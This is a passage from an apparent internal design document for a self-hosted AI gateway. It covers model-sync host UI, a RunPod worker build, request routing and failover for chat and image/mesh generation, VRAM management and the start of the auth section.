two or more LAN-only files < 1 MB in one dir collapse into `msrc-s-<dir>` — with the
badge (`HF auto`, `URL ✓`, `URL ✓ size only`, `outdated — re-check`, `LAN only`,
`URL failed — LAN` = a public source in some controller's PERSISTED fallback — until
Sync now or a new Check & save, not "this session"),
the aliases (blocked marked, reason as title), the URL as escaped TEXT (never a link:
it may carry a token) and the actions — a `source-check` form (path + URL; prefilled
for outdated) on LAN/outdated/failed rows, ONE editable `source-check-dir` form (dir +
repo) per `models/…` folder with ≥ 2 LAN-only files or a stale dir entry, `remove`
(`data-confirm`, the row's `entry_key`) on URL ✓/outdated/failed rows. POST-only, under
`/ui/hosts/managed/source-check|source-check-dir|source-remove`, answered on
`?sub=models`; `hosts_source_remove` AWAITS `_remove_source` on the loop. The banner is
a `?msg=` redirect (browser history, access log): `main.check_source` refuses a bad URL
with the FIXED `SRC_URL_REFUSED` (never the URL — its query may hold a token), and
`hosts_source_check` logs the path only, never the answer. The Models
sub-tab is live (3 s) only while `pending`, never on a refusal (its URL is the POST).
`modelsync` also owns `parse_manifest`/`normalize_manifest` (re-exported by
`hostctl`) and the pure `without_fallbacks` filter; the controller still drops stale
fallback state and persists it. Thunder and RunPod can share these decisions without
importing a lifecycle controller.
The host card's per-file sync rows carry `_card_src_badge` — the plan view's
`source`/`origin` (`modelsync.plan_view`, delegated by hostctl `_plan_view`, adds
them from the url catalog the plan was handed), `outdated` from `_model_source_kinds`
(fetched once per Backends render in a worker thread, only when a view has a plan), `URL failed — LAN` from the view's
`url_fallback`. The badge is the CURRENT source (where this plan would fetch the file),
never its provenance: a present file LAN-synced before its URL entry existed reads
`URL ✓`/`HF auto` — the manifest's `source` is shown nowhere. `_hosts_panel`
lists EVERY managed host (also one without ComfyUI or without any backend), and
`_dash_hosts` puts the long-run banner on the Dashboard. The backend form attaches: a
`host_managed` select ("(none / free text)" + every store managed host) beside the
free-text `host` input — ONE `host` stored; its inline `_MHOST_JS` shows the
`data-mhost` fieldset (`_managed_fieldset`, rendered for EVERY backend, only `display`
switched: `remote_port` pre-filled with the profile default, and for `openai` the
`svc_setup`/`svc_start`/`svc_health` fields with the "no tokens here — plain text; the
HF token belongs in Server → API Keys" and the "stdin-reading commands swallow the
script" hints) and makes `url` readonly (never disabled). `backend_save` starts from the
old row, drops any legacy `thunder` key and, with a managed host, refuses (400, form as
typed) an unknown host, a type without a profile, a config-defined identity (R-K3), a
remote port missing/out of range/taken on that host, a second ComfyUI, a slug
collision (R-W8) and whatever `profile.validate` refuses, then assigns `local_port`
via `assign_local_port` and derives `url`; ComfyUI dirs default to
`/home/ubuntu/ComfyUI/output|input`. Detached: `remote_port`/`local_port` dropped, and
a url equal to the old derived one counts as blank → 400 (a backend left on a
127.0.0.1 port nothing forwards looks healthy-ish and is dead); `svc_*` stay on an
`openai` row (a detach does not throw away a script). Every action is a POST in
`_POST_ACTIONS` (`save, delete, start, stop, forget, restart-service, resetup, sync,
delete-unknown, catalog, modelsrc-scan, modelsrc-pin, modelsrc-list, modelsrc-host` —
the last five answer on Server → Models; the tokens' `/ui/server/provider-token` and
`/ui/server/hf-token` likewise),
Start/Stop/Forget/Delete with `data-confirm`; the Backends tab is live (3 s) while a
host phase ≠ `off` or an op runs, static for the forms and refusals; `_FAULT_SOURCE`
labels `lifecycle` "host lifecycle" and `sync` "model sync". The key files
(`<kind>.key`, `<kind>.key.pub`, `<kind>-known_hosts/`, the control sockets in
`<kind>-ctl/` — today `thunder*` — plus `modelsrc.key`, `modelsrc.key.pub`,
`modelsrc-known_hosts`, next to `store.db`) are in `.gitignore` AND in both `deploy.sh`
exclude lists (`RSYNC_EXCLUDES`/`TAR_EXCLUDES`) — without the latter `rsync --delete`
wipes the instance key and the LAN pin on every deploy, and would pull a live socket
(pinned by `test_hostctl.MainWiring.test_deploy_and_gitignore_exclude_keys`).

`ops/runpod/` is the Docker build context of the RunPod Serverless worker (image
profile: Qwen-Image 2.1), not a script run over ssh: `Dockerfile` (CUDA 13 base; Python,
torch, torchvision/audio, CUDA tag and the ComfyUI commit are `ARG`s equal to the Thunder
bootstrap's pins — `test_runpod_worker.py` compares them), `install-nodes.sh` (the third
copy of `parse_node_line`, pinned equal to the two bootstrap copies), `nodes.image.txt`
(lines copied VERBATIM from `thunder-nodes.default.txt`, a subset — a pack at another
revision renders a different picture), `extra_model_paths.yaml` (models from the network
volume at `/runpod-volume/models/<folder>/`, the same tree as ComfyUI's), `gw_placeholder.png`
and `handler.py` (the worker: one prompt per job against the in-container ComfyUI, plain
functions over a base URL so they test without the `runpod` SDK or a GPU; our own code —
nothing copied from the AGPL worker-comfyui). The image is built by RunPod from a PRIVATE
worker repo, never from ai-hub: `sync.sh <checkout>` copies the context there and writes
`worker.json` (the version — ai-hub commit, `-dirty` when `ops/runpod` has uncommitted
changes — that every job reports back as `worker_version`); commit, push and
`gh release create v<N>` (which starts the billed build) stay the operator's. After each
release the operator presses Probe.

## Request flow

- **Chat/LLM** (`/v1/chat/completions`, `/v1/completions`, `/v1/embeddings`,
  and `/v1/audio/speech` — a binary TTS passthrough: `route()` strips `stream`
  on `/v1/audio/*`, fills per-alias `alias_voice` defaults, and the adapter
  skips body parsing/stats blobs for non-text responses — via `route()`): all
  funnel through **`_dispatch_or_park()`** — `resolve_routes()` →
  ready vs busy split → `backend_adapters[bid].dispatch(NormalizedRequest)` to the
  first ready, failing over on every `httpx.TransportError` — connect errors, a pooled
  keep-alive connection the backend had closed (`RemoteProtocolError`), a reset
  (`ReadError`/`WriteError`); all of them surface before the client saw a byte — and on
  llama-swap's "unable to start process" 502 (backend-local load failure,
  `_retryable_upstream_error`); other HTTP error statuses return as-is. ONE exception:
  a `ReadTimeout` on a `paid` or `anthropic` backend (`_bills_while_generating`;
  connected, sent, no answer within the 300 s read budget — it is most likely still
  generating) answers 504 instead of failing over, or the failover buys the same answer
  twice; on an unpaid backend it still fails over. An `anthropic` backend is NOT made
  `paid` for this: the scheduler puts unpaid before paid, so a flat subscription marked
  paid would sort behind every unpaid candidate of a mixed alias.
  `adapters._CHAT_TIMEOUT` is `httpx.Timeout(300, connect=10, pool=30)` — a scalar 300
  let a SYN-swallowing host hold the failover for five minutes. A `PoolTimeout` (the
  gateway's OWN shared pool exhausted, `max_connections` 200) is no backend's failure:
  503 + `Retry-After`, no failover (same pool for every candidate) and no fault row. Anything else an adapter
  raises is a clean 502 naming the backend (fault kind `error`, no failover — a bug
  reproduces), and `main._unexpected_error` turns any exception left over on `/v1/*`
  into a 502 through the HTTPException handler, so it is logged and `/v1/messages`
  answers in Anthropic shape instead of a raw 500 Claude Code shows blank. The adapter opens the upstream stream
  BEFORE answering, so streamed upstream errors carry their real status too. All busy → **park by default** (FIFO queue, per-alias `park_s`)
  until a backend frees, else 503; no client field. Before dispatch,
  **sampling defaults** are folded in two stages whose ORDER is the precedence
  (client > alias > backend; each stage only fills keys that are still absent):
  `_apply_alias_sampling()` in `route()`/`/v1/responses` applies the alias's
  `alias_sampling` (store settings, cached in `main.alias_sampling`), then
  `adapters._prepare()` applies the backend's `sampling_defaults` — there, so it
  is derived PER BACKEND and a failover re-derives it. Text endpoints only (never
  embeddings/audio). Rationale: a backend whose server samples with bare defaults
  (vLLM, no truncation sampler, temp ≈ 1) degenerates into token salad when a
  client sends no sampling params — measured 2026-08-10 on Infermatic/Anubis-70B.
  Also before dispatch, `_normalize_reasoning()` folds the client `reasoning`/`reasoning_effort` control
  to `off|on|None` and stashes it in `body["_reasoning"]`; the adapter strips all
  `_`-prefixed keys and runs `apply_reasoning` **per backend** on a copy of the
  body (so failover re-derives it). `/v1/responses` translates bodies and shares
  `_dispatch_or_park()` too (also parks, and normalizes reasoning incl. the
  Responses `{effort}` shape); `background:true` runs it async via the official
  Responses background mode (see below).
- **Messages** (`POST /v1/messages`, `POST /v1/messages/count_tokens` — the Claude
  Code frontdoor): `_messages_route()` authenticates (`x-api-key` OR `Authorization:
  Bearer` — Claude Code uses the former; both carry a GATEWAY key), folds
  `thinking:{type:enabled|disabled}` into `body["_reasoning"]` (an explicit client
  control beats the per-alias default, as on the chat path; honoured by translated
  backends only) and hands over to the SAME `_dispatch_or_park()`.
  `count_tokens` for a chat backend is answered from the bridge's estimate BEFORE
  dispatch, so sizing a context never queues for an in-flight slot. Deliberately no
  `_apply_alias_sampling()` here: Claude Code sends a complete request, and a
  chat-shaped `min_p` would 400 against Anthropic. Errors are re-shaped to
  `{"type":"error","error":{…}}` — Claude Code reads `error.message` and renders a
  FastAPI `detail` body as blank. Routing filters candidates by `serves_path()`, so
  an Anthropic backend is invisible everywhere else and an alias served only by
  such backends answers `404 … reachable through POST /v1/messages only` instead of
  a misleading 503.
- **Generation** (`POST /v1/generations`, and the OpenAI shims
  `/v1/images/generations` + `/v1/images/edits`): `get_gen_routes(alias)` resolves
  the alias via the **separate** generation store (`image_models`/store), filtered
  to enabled+healthy generation backends of the candidate's own kind
  (`adapters.cand_kind` == `adapters.backend_kind`); LoRA-aware preference +
  busy→park. Everything the ROUTER reads off a candidate's workflow (image slots for the
  `images` filter and the shims, the params refusal, the schema, the chain export) goes
  through `adapters.cand_workflow` — `workflow_json`, else the `workflow:` FILE the adapter
  loads, else None = unknown, which filters nothing: reading a path alias as `{}` dropped
  every reference image (`test_gen_inputs.py`); a
  `jobs.py` job runs via `adapter.generate()` — ALWAYS as a tracked task in
  `_gen_tasks` (`_spawn_gen`); a sync request just waits for it (`_run_gen_sync`,
  `asyncio.wait`, so the job row owns the outcome). A queued/running job can be cancelled:
  `cancel_generation` marks the row failed FIRST (terminal states are final in `jobs.py`),
  then cancels the worker task, whose adapter stops its OWN prompt (`_stop_prompt`) and
  whose CancelledError arm records a created cloud task on the row; `adapter.cancel(job_id)`
  is the targeted fallback when no worker task exists.
- **Workflow chains** (`_run_chain`): a gen alias's stage-1 config carries a
  `successor` (`{alias, export_node, mesh_param, relay?, keep_from_mesh?, rig?}`);
  stage 1 exports a mesh under a gateway-pinned filename (`gwchain_<jobid>`) and
  ONLY stage 2's result is delivered (+ any `keep_from_mesh` files). The three
  backend-specific spots are **adapter hooks**, not branches in the router
  (`ChainExport` + `chain_export`/`chain_take_mesh`/`chain_feed_mesh`; the base class
  refuses both roles, so a new backend type is opt-in): ComfyUI pins the export node's
  `filename_prefix` (extension from pins/mapped params on `file_format`), takes the
  mesh off `/view` and feeds a PATH (shared disk) or an upload into the stage-2 input
  dir; a **cloud stage** (`CloudTaskAdapter`, so Meshy AND Tripo) names it
  `gwchain_<jobid>.glb` with NO pins, takes the `model.glb`
  RESULT BLOB and feeds it as `req2.upload_files[mesh_param]` (Meshy embeds it as the
  rigging `model_url` data URI, Tripo uploads it to `/v3/files` and sends the token;
  `mesh_ref` = `<upload:… (N MB)>` either way). So EITHER stage may be a cloud one, and all nine
  ComfyUI/Meshy/Tripo × ComfyUI/Meshy/Tripo combinations run: `Meshy-Humanoid` →
  `mesh-mia`, `Trellis2-…` → `Meshy-Rig` and `Tripo-Humanoid` → `Tripo-Rig` are the
  same code path. A cloud stage
  has no shared disk, so `_kind_cloud` on either side FORCES
  `relay: upload` whatever the alias stored (the editor hides the field); a cloud
  stage 1 without `glb` in `target_formats`, and a rigging alias (`mod.RIG_ENDPOINT`)
  as stage 1 at all,
  are refused by `chain_export` BEFORE credits are spent. `mesh_param` is validated
  against the successor's mapping (param or label) or — a cloud successor has no
  mapping — against its file fields (`public_fields()[2]`). A paid stage-1 cloud task
  keeps its own kind/task id/endpoint/request/sub-tasks/credits under
  `meta.chain_stage1` (keys `backend, cloud, cloud_task_id, meshy_task_id, endpoint,
  consumed_credits, request, tasks`; stage 2's
  are the top-level meta, which would otherwise overwrite them in the merge), and
  `admin._cloud_table` renders one table per cloud stage — naming the VENDOR from that
  stage's own meta, because the two stages may be different vendors. `rig` accepts the
  cloud values `meshy` and `tripo`: tagged on the delivery like the others, but NEVER
  normalized or validated —
  `normalize_delivery`/`validate_delivery` run for `generic`/`mixamo` only, a cloud rig
  follows its vendor's conventions (which bone names a `tripo` one carries is
  `meta.rig_spec`). Stage 1 gets
  the normal routing guarantees: candidates re-resolved while parked (force pin +
  LoRA eligibility kept), misconfigured candidates skipped, connection errors fail
  over (stage-2/hand-off errors are FINAL). The job row's `backend` is re-pointed
  at claim and hand-off (`jobs.set_backend`) so cancel interrupts the LIVE backend.
  Stage-1 params are threaded to the successor by mapping **label** (never the raw
  node-based name), and `_apply_mapping` SILENTLY skips a name the successor does not
  bind — so what stage 2 was handed is recorded on the job (`meta.chain_stage2`:
  alias/backend/relay/mesh_param/mesh_ref/params, plus stage 2's `applied` on success)
  and rendered by `admin._stage2_section` as handed / applied / dropped. Recorded at
  run time, never re-derived from config (the mapping may have moved since); written
  into `jobs.complete`'s meta AND, via `fail_meta()`, onto a failed row — a stage-2
  failure is when the hand-off matters most. Without it, "did my param reach the
  rigger?" was only answerable from the backend's own ComfyUI history.
  Chain stages run with `slot_held` (the chain claims the one slot itself — no
  double count). Two hand-offs (ComfyUI↔ComfyUI; with a cloud stage the second is
  forced):
  `relay: path` (default) keeps both stages on ONE backend (shared disk, one slot
  held across both — queue-isolated) and passes the mesh's absolute output path;
  `relay: upload` lets the successor run on a **different** backend — the gateway
  fetches the mesh (`/view`), uploads it into the stage-2 backend's input dir
  (`adapter.upload_input` → ComfyUI `/upload/image`) and passes the file's
  **absolute input-dir path** (backend `comfy_input_dir`, blank = derived from
  `comfy_output_dir`'s `…/input` sibling) — the successor consumes it exactly like
  a path hand-off; only with no input dir known does the bare stored name go over
  (then a load-from-input node is required). Cross-backend releases the stage-1
  slot AND frees its ComfyUI VRAM once the mesh is in hand, then claims the
  stage-2 slot.

## Routing rules (`resolve_routes`/`get_gen_routes` + `alias_entry`)

A backend is a candidate only if enabled, healthy, **not busy** (in-flight cap),
maps the alias, and exposes the resolved model. Recurring concepts:

- **Route index** (`_route_index` + `rebuild_route_index()`): alias→candidates and
  bare-model-id pass-through are **precomputed** (insertion order, no sort);
  `resolve_routes()` evaluates the live flags (healthy/busy/draining) per request and
  applies the scheduler ordering — unpaid before paid, then fastest (`backend_tps` /
  `gen_speed`), unmeasured first. A freed backend takes the waiter the scheduler
  designates for it (`scheduler.designated_taker`: overdue > same type key > oldest;
  `affinity_max_wait_s`, default 120, Server tab). `priority` routes nothing any more —
  it only keeps the backend LIST order stable. Rebuilt by `rebuild_backends()`/`rebuild_virtual_models()` and on every
  discovery model-set change — never mutate `backends`/`virtual_models` outside
  those functions or the index goes stale.

- **Aliases** (`virtual_models`): string (same everywhere) or per-backend dict whose
  value is a model id (old entries may still be `{model, priority}` — `alias_entry()`
  parses that shape, the priority is ignored).
- **Backend prefixing** (`split_backend_prefix`): `<backend>/<model>` pins that
  backend; a bare id/alias goes through the scheduler. `local: true` *also* lists models
  bare (cross-backend implicit alias). `model_prefix` toggles prefixed listing.
- **`current`** (`adapters.CURRENT_MODEL`, llama-swap only): `<backend>/current`, or
  `current` as an alias's per-backend model, resolves to a model the backend has
  ALREADY loaded — never loads one. `backend_running` holds `/running` as
  `adapters.parse_running` reads it (`kind` embedding/rerank/chat from the llama-server
  flags in `cmd`); a key there is what makes `current` routable (`main._is_current`, so
  `rebuild_route_index` also rebuilds when `/running` appears or vanishes), and a
  backend that LISTS a model named `current` keeps it. The index stores the placeholder;
  `resolve_routes` picks per request (`adapters.pick_current`: the endpoint's kind —
  `/v1/embeddings` embedding, else chat, because llama-swap keeps bge-m3 loaded beside
  the chat model — ready over starting, the served set so the model filter holds,
  `backend_last_key` among equals) and DROPS a backend with nothing suitable from ready
  AND busy: a busy backend with the right model parks the call, an idle one without
  it must never take it. Freshness: `_dispatch_or_park` and each park-loop wake
  `await _refresh_loaded(alias)` BEFORE `resolve_routes` (a live `/running`, 2 s; a
  failed query keeps the last list) — never between resolve and dispatch, where the
  in-flight claim stays await-free. Nothing loaded anywhere → `_nothing_loaded_error`'s
  503 naming the backends. Allow-list: a whole-backend grant or the exact
  `<backend>/current`, never a single model id. `_loaded_info` → `loaded` in `/health`,
  the Backends tab and the Dashboard panel (`admin._loaded_text`). `test_current_model.py`.
- **Concurrency/busy** (`backend_inflight`, `backend_busy`): incremented in
  `dispatch()`/`generate()`, decremented on completion incl. the streamed `finally`.
  A generation job claims in `_run_job` with the busy check right before
  `_inflight_inc` (no await between) and the `try` that releases the slot right after
  it — the candidate list is computed several awaits earlier and a failover target was
  never checked, so both overran `max_concurrent`, and a cancel landing in an await
  between claim and `try` leaked the slot for good. A candidate busy at claim time is
  skipped; if that leaves the job unfinished, `_run_job` returns False and the job parks
  again (`_run_gen_now` → `_run_gen_parked`) with its `state` — tried backends, attempts,
  execution faults — carried over. The chain claims the same way (busy check → inc →
  `try` → row updates).
- **Re-routing onto a returning backend**: waiting work is never pinned to the
  backend it queued for. `refresh_backend` calls `_notify_slot_free()` on DOWN→UP
  and on a model-set change (parked calls re-evaluate); `apply_backend_change` and
  `cancel_drain` do the same; parked gen jobs re-resolve routes every 2 s. The slow
  part was NOTICING, so `health_loop` polls backends concurrently (a sequential loop
  added every dead backend's connect timeout to the cycle) and `fast_probe_loop`
  re-polls only UNHEALTHY backends every `fast_probe_interval_s` (default 3, Server
  tab, 0 = off) while `_capacity_wanted()` — `_parked` non-empty, or a gen park loop
  pinged `_gen_wait_ping()` within 5 s. A TIMESTAMP, not a counter: a cancelled job
  task cannot leave a phantom waiter. `_probing` guards against two concurrent polls
  of one backend. `_run_job` re-points the job row (`jobs.set_backend`) at the
  backend that actually claims it — a parked job routinely lands elsewhere, and a row
  naming the wrong backend sends you reading the wrong ComfyUI's log.
- **Parking** vs 503: "all busy" is distinguished from "no backend" — only the
  former parks (the default). The queue is `_parked` (rich entries: alias, source,
  deadline, `asyncio.Event`); `_inflight_dec`→`_notify_slot_free` wakes all in FIFO
  order so the oldest eligible claims the freed slot (the invariant: dispatch's
  `inflight_inc` runs with no `await` between it and `resolve_routes`). Park time
  per alias via `alias_park_s` (store `alias_park` + config), else `park_timeout_s`
  (default 60); `0` disables. Timeout → 503 + `Retry-After`. "Parked calls" panel
  on the Dashboard. The media counterpart is `max_queued_gen` (Server tab, default 200):
  `run_generation` refuses a new ASYNC job with 503 once `_gen_tasks` holds that many
  (sync jobs hold a connection and cap themselves), and `_clamp_ttl` caps a client's
  `ttl_s` at `jobs.max_ttl_s` (default 7 days) — `test_gen_limits.py`.
  **Async chat has no OpenAI spec** — async lives on the Responses
  background mode: `POST /v1/responses {background:true}` → `resp_<jobid>` queued →
  `GET /v1/responses/{id}` poll → `POST …/cancel`; the worker (`_run_bg_response`)
  parks in the same queue (jobs.py task `response`).
- **LoRA-aware generation routing**: a backend lacking a requested LoRA is dropped
  from candidates (decided over all candidates incl. busy → parks for the
  LoRA-backend rather than spilling); a LoRA on no backend is ignored (the normal
  ordering wins); an explicit `backend` force is never overridden. Per-backend LoRA sets
  come from discovery (`backend_loras`).
- **Model-sync gate** (managed hosts): `main.modelsync_gate(backend, alias)` inside
  `_gen_routes` — a `comfyui` backend attached to a managed host (backend → `host` →
  controller → service, R-W7; by backend NAME the lookup finds nothing) whose
  `is_alias_ready(bid, alias)` is False (before the first plan, outside `syncing|ready`, a
  file missing, a block) leaves `ready` AND `allc`: an alias with other candidates runs
  there, one without gets `_gen_pick`'s 503 carrying the gate texts (`models for
  <alias> are syncing on <backend> (12.3 of 31.0 GB)` / `… blocked on <backend>:
  <reason>`) instead of "no healthy backend" about a backend that is UP. The waiter
  designation, a force pin and `_entry_can_use` inherit it through `_gen_routes`; the
  chain's path-relay successor, read from the store, is judged by
  `_chain_successor_on`. In-memory only (`is_alias_ready`/`alias_status` do no I/O) —
  it runs per waiter × backend in a worker thread. While gated, an alias that runs only
  on managed hosts (`_gated_only_aliases`) reads its schema, image slots and LoRAs empty
  (`host_view`'s `gated_only` says so on the
  card); a job already PARKED when its alias becomes gated still fails with the generic
  text. `test_modelsync_routing.py`.
- **Execution-fault quarantine** (`scheduler.exec_fault_*`, state `main.gen_exec_faults`
  keyed `alias|bid`): a generation backend that ANSWERS but cannot EXECUTE is invisible
  to every other signal — discovery only calls `/object_info` so `backend_healthy` stays
  True, and the executor watchdog only sees a STUCK queue while this one drains fine,
  turning every prompt into an error in seconds. It was also self-reinforcing: a
  candidate that never succeeds never gets a `gen_speed` sample, so it kept the
  unmeasured **probe-once** head start and won the ordering again on the very next
  retry (measured 2026-09-03 on comfyui-strix — a torch/ROCm update broke
  `flux_time_shift`, so every Flux/Krea2 model load died while two healthy backends sat
  idle and four consecutive user retries all landed on the broken one). So: an
  execution error now **fails over to the next candidate** (never a repeat on the same
  backend — it reproduces; `self_retries` stays a connection-path thing), and a fault is
  charged ONLY once a later candidate succeeded on that same job — the difference
  between "this backend is broken" and "this request is broken". When they all fail
  alike nobody is charged and the report names the execution error plus the backends
  that shared it, never `_gen_exhausted_msg`'s "unreachable". Two consecutive charged
  faults quarantine that `alias|backend` for `EXEC_QUARANTINE_S` (900 s): it leaves
  `ready` but stays at the END of `allc`, so the job PARKS for a healthy backend
  instead of 503-ing and a failover can still reach it as the last resort — and if
  EVERY candidate is quarantined the quarantine is ignored entirely (a blocked alias is
  worse than a slow one). One success clears the record; `exec_probed` outlives the
  window on purpose, or the expiry would hand the head start straight back. Surfaced as
  `quarantined` in `/health` + the Backends tab, which it must be: unlike the fail rates
  this one really does change routing. **A CLOUD candidate is excluded from the failover**
  — a billed task may have failed AFTER creation, and re-running the job would buy the
  same mesh twice (the invariant `tripo.py` protects). The same holds for the
  FAILOVER-class errors a cloud task raises after it exists (`_poll`'s ConnectionError
  past `disconnect_grace`, its `max_wait` TimeoutError, a create POST whose answer was
  lost — `_create` marks that `create_unconfirmed` on the trace): `main._billed_cloud_task`
  makes them FINAL in `_run_job` AND in the chain's stage 1 — no self-retry, no next
  candidate, the row names the task id and that it may still run at the vendor. Only
  `CloudTaskRetryable` (vendor-side, zero credits) still retries. A cancelled job's
  CancelledError arm writes the trace too (`jobs.merge_meta`), so a cancelled cloud row
  still names the task the vendor bills. Covered by
  `test_gen_quarantine.py` + `test_run_job_failover.py`.
- **Context windows**: every `/v1/models` entry carries `context_length` when known
  (`main.model_context` → `adapters.model_context_for`: the backend's `model_context`
  `glob=tokens` rules first, then what discovery LEARNED — `adapters.extract_context`
  over the listing, plus for llama-swap each LOADED model's `/upstream/<m>/v1/models`;
  kept in `backend_context`, merged by `merge_learned_context`, persisted like
  `backend_models`). A bare id or alias publishes the MINIMUM over its backends.
  Unknown = absent, never 0. Clients that find none assume a default (Oh My Pi 128k)
  and their over-long prompts 400 at the backend — `test_context_length.py`.
- **Per-backend model allow/deny** (`models_allow` / `models_deny`, comma-separated
  globs): `adapters.filter_models` narrows what discovery found — allow first (empty =
  keep all), then deny removes from the rest, so DENY WINS and "`gpt-*` except
  `gpt-*-embed`" is two lines instead of an enumeration. Applied in
  `main.refresh_backend` on `caps.models`, NOT in `extract_models` (that is the openai
  path only): so it holds for every backend type — a ComfyUI backend's checkpoint list
  shortens by the same two knobs — and it runs BEFORE the `changed` compare, the persist
  and `rebuild_route_index()`, so `/v1/models`, routing, alias candidates and the Mapping
  dropdowns all read the one filtered set. The filter is otherwise INVISIBLE (a typo'd
  whitelist leaves the backend healthy and routing nothing, and every symptom points
  elsewhere), so `backend_model_counts` records what each poll measured and
  `_model_filter_info` publishes `models_filtered: {kept, total}` to `/health` + the
  Backends tab, which badges `filtered 3/6` and, at zero, `0 models — filter matches
  nothing`. A backend that never polled publishes NOTHING — `(0, 0)` derived from an
  empty set would badge an unreachable host as a filter mistake. `test_model_filter.py`.
- **Per-backend extra models** (`models_extra`, comma-separated EXACT ids, no globs —
  there is nothing for a pattern to expand against when discovery never saw the name):
  `adapters.add_model_extras` is the one knob that ADDS to the discovered set, because a
  filter can only ever subtract and routing checks `real in backend_models[bid]` in three
  places — so a model the backend SERVES but does not LIST is unreachable by every name,
  alias and `backend/model` prefix alike. Measured 2026-09-11 on npu-strix: FastFlowLM
  answers `/v1/embeddings` (768-dim, and it IGNORES the `model` field — three different
  names return the identical vector) and `/v1/audio/transcriptions` while `/v1/models`
  and `/api/tags` return the 36 chat models only, so its Embedding-Gemma and
  Whisper-V3-Turbo simply did not exist for the gateway; that also makes the whisper
  model `_whisper_route()` looks for reachable, moving voice-reference transcription off
  the gateway's CPU faster-whisper. Applied in `main.refresh_backend` right AFTER
  `filter_models` and AFTER `backend_model_counts` is written: after the filter so a
  narrow whitelist cannot take the extras straight back out (otherwise the two knobs
  would have to be kept in sync), after the counts so `kept/total` keeps describing what
  the filter did to what the poll MEASURED. Only a SUCCESSFUL poll publishes them — an
  unreachable backend advertising a model is a 503 waiting to happen. The verdict is
  `models_added: [ids]` in `/health` + the Backends tab (`+2 listed manually`),
  deliberately NOT named `models_extra`: that key carries the config string for the
  editor to pre-fill, and one key cannot be both (the form needs the string always, the
  badge needs the measurement only when there is one). A typo'd id fails the other way
  round from a filter typo — it routes, looks healthy, and dies at the backend.
  `test_model_filter.py`.
- **Allow-list filtering**: `/v1/models` authenticates the caller and filters by
  their allow-list (entries may be aliases, model ids, or **backend names** =
  all that backend's models); image aliases are included; `?type=chat|image`.
  The user editor's "all chat / all image / all backend" boxes store GROUP TOKENS
  (`main.GRANT_ALL_CHAT` `@chat`, `@image`, `@backends` = `admin._GRANT_TOKENS`),
  resolved per request by `_expand_grants`/`_model_allowed` — ticking "all" used to
  store a snapshot of today's names, so an alias or backend added later was silently
  refused; saving drops the member names a token covers (`admin._normalize_grants`).
  `GET /v1/models/{id}` applies the same grant (`_model_allowed`) and answers outside it
  with the unknown-model 404, so a restricted key cannot probe what exists
  (`test_model_lookup_allow.py`).
- **Alias/model-name collisions** (`alias_model_conflicts`): surfaced in the
  Input & Routing tab, split `covered` vs actionable `shadowed` (`/health` carries
  the shadowing entries only).
- **Host coordination** (every box with a ComfyUI backend — the LLM-vs-media policies
  matter on SHARED boxes, the VRAM policy on all; `docs/host-coordination-plan.md`):
  backends group by physical box (`backend_host`: explicit `host` field, else URL
  IP → `backend_hosts`/`host_backends`, shown in `/health` and the Backends tab's
  Hosts panel). A backend attached to a managed host carries the host's NAME as `host`,
  so all services of one VM group under it — never under the `127.0.0.1` of their
  tunnel URLs, which would lump every rented VM together with the gateway box. Per-host policies (store settings `hosts`, cached `hosts_meta`):
  chat candidates on a host with a RUNNING media job sort LAST in `resolve_routes`
  (never dropped; flag `avoid_llm_during_media`, default on);
  opt-in `llm_unload_before_media` GETs llama-swap `/unload` first.
  **VRAM is freed BEFORE a job, not after it** — ComfyUI never releases its model
  cache by itself, and at job END nobody knows yet what comes next, so the answer
  was always guessed. At CLAIM it is known: `_claim_gen_backend(backend, key, vram_key)`
  records the affinity key `backend_last_key` (media: the alias) and, when what the GPU
  HOLDS (`backend_vram_key`) differs from what the request will LOAD, AWAITS the free
  before the prompt goes out (`scheduler.free_vram_before_job`, pure +
  `test_scheduler.py`; host flag `comfy_free_before_job`, default on for EVERY ComfyUI
  box). What it loads is the **model-set key** — `scheduler.model_set_key` over the
  workflow's loader nodes (class /load/ minus image/mask/mesh/path loaders; only their
  STRING-valued weight inputs — name/model/ckpt/unet/clip/vae/lora/gguf — never node
  ids, links, dtype/device/`keep_models_loaded`), computed by
  `ComfyUIAdapter.model_set_key(req)` AFTER pins, the LoRA list/cascade and the mapped
  params, so the request is built before the claim. The alias was the key at first and
  is wrong both ways: `img2mesh-trellis2_high`/`_low` both load `microsoft/TRELLIS.2-4B`
  and were freed+reloaded on every switch, while a mapped model choice or a LoRA under
  ONE alias never freed. Alias stays the FALLBACK (no loader recognised) and the
  affinity key. The two records are separate on purpose: `backend_vram_key` is written from
  the free's VERDICT (`_comfy_free` returns one), never from the attempt — a failed or
  skipped free leaves it `None`, and `None` (unknown, or two aliases' sets mixed by a
  job in flight, or a gateway restart — which never empties ComfyUI's VRAM) counts as
  a change. And "awaited" means watched: ComfyUI's `POST /free` only sets two flags
  and answers 200; its single worker reads them after `q.get()`, and `set_flag`'s
  `notify` is LOST while the worker sits in its post-prompt `gc.collect()` — exactly
  when the gateway's /history poll posts the free — so the flag would fire only after
  the NEXT prompt ran. `_comfy_free(settle_s=…)` therefore polls `/system_stats`'
  `torch_vram_total` (torch's reserved pool, what other processes cannot use) and
  re-posts every 2 s until it dropped to ≤ 20 %, else reports False after 30 s
  (`test_run_job_failover.py::ComfyFreeSettles`). It is also the only hook that sits between two CHAIN stages — two
  workflows on one backend with no job end in between (measured 2026-09-05, job
  `cc604da29e0e`, Meshy→`mesh-mia` on k12-gpu: stage 2 died on
  `CUDA out of memory. Tried to allocate 20.00 MiB` with 21.4 of 23.5 GiB held by
  the ComfyUI process, and Make-It-Animatable runs in its OWN venv/process, so it can
  never share that cache). The after-job free (`_free_comfy_vram`, flag
  `comfy_free_after_job`, default on for shared hosts only — all four host flags and
  their defaults live in ONE table, `scheduler.HOST_FLAGS`, read by `main._host_flag`,
  the console's host form/panel and `host_save`, and `host_save` derives "shared" from
  the LIVE backend list, never from a hidden form field) survives for its one
  remaining purpose — a shared box must free even when NO media job follows, or the
  next llama-swap load aborts — and skips when the waiter the scheduler will hand
  this backend next (`_designated_gen_waiter`, so `exclude`/force/LoRA eligibility
  apply) wants the alias its VRAM holds. Asking the scheduler, not scanning the queue
  by alias, is what keeps a waiter that can never run here (a chain that excluded the
  backend after a failed stage 1) from suppressing the free forever
  (`test_run_job_failover.py::FreeAfterJob`).

## Auth / multi-user

`authenticate()` resolves a Bearer token to a user (`_users_by_key`) or the
master `_MASTER_ADMIN` (the top-level `api_key`); `gate_request()` enforces the
allow-list (`_model_allowed`, incl. whole-backend grants) + quotas and attributes
the call. Bootstrap-open with no users and no master key. `ui_locked()` is the SAME
